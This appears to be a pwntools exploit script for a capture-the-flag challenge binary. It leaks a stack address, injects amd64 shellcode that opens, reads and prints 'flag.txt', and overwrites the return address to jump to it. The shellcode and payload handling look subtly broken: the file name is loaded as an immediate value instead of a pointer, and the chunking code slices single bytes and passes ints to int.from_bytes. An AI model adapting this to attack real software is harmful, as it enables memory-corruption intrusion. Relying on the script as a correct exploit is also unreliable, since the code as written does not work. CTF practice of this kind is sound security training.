import pwn
from pwnlib.util.packing import p64

PWNSIZE = 64 // 4
p = pwn.process("./chall")
print(str(p.recvline(), "ascii"))
p.sendline(bytes(str(PWNSIZE), "ascii"))
payload = bytearray()
address = int(p.recvline().partition(b": ")[-1].strip().decode("ascii"), 16)
print(str(p.recvline(), "ascii", "ignore"))

pwn.context.clear(arch="amd64")
FLAG_STRING = "flag.txt"
payload += pwn.asm("""
        xor rax, rax
        inc rax
        inc rax
        mov rdi, 0x{0}
        """.format(FLAG_STRING.encode("ascii").hex()))
payload += pwn.asm("""
        xor rsi, rsi
        xor rdx, rdx
        syscall
        push rax
        xor rax, rax
        pop rdi
        """)
payload += pwn.asm("""
        mov rsi, """ + hex(address))
payload += pwn.asm("""
        mov rdx, {0}
        syscall
        xor rax, rax
        inc rax
        syscall
        """.format(hex((19 * 4) - 1)))
assert (len(payload) < 18 * 4), "payload is too long already"
payload += b"1" * ((19 * 4) + 4 - len(payload))
payload += p64(address)
print(str(payload, "ascii", "ignore"))
split_up_payload = (int.from_bytes(cint)
                    for cint in payload[::4])
for integer in map(str, split_up_payload):
    print(integer)
